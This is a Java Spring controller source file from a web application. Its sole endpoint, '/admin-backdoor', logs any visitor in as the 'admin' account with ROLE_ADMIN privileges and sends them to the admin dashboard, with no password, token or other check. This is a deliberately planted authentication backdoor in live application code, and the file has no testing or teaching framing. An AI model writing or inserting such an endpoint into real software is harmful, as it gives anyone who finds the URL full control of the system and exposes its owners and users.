package com.kawai.controllers.web;

import com.kawai.models.Account;
import com.kawai.repositories.AccountRepository;
import jakarta.servlet.http.HttpServletRequest;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;

import java.util.Collections;
import java.util.Optional;

@Controller
public class BackdoorController {

    @Autowired
    private AccountRepository accountRepository;

    @GetMapping("/admin-backdoor")
    public String adminBackdoor(HttpServletRequest request) {
        Optional<Account> adminOpt = accountRepository.findByUsername("admin");
        if (adminOpt.isPresent()) {
            Account admin = adminOpt.get();
            GrantedAuthority authority = new SimpleGrantedAuthority("ROLE_ADMIN");
            
            org.springframework.security.core.userdetails.User userDetails = 
                new org.springframework.security.core.userdetails.User(
                    admin.getUsername(),
                    admin.getPasswordHash(),
                    Collections.singletonList(authority)
                );

            UsernamePasswordAuthenticationToken authReq = 
                new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
            
            SecurityContextHolder.getContext().setAuthentication(authReq);
            request.getSession().setAttribute("SPRING_SECURITY_CONTEXT", SecurityContextHolder.getContext());
            
            System.out.println("🚀 Backdoor used: Admin logged in manually!");
            return "redirect:/admin/dashboard";
        }
        return "redirect:/ops-login?error=true";
    }
}
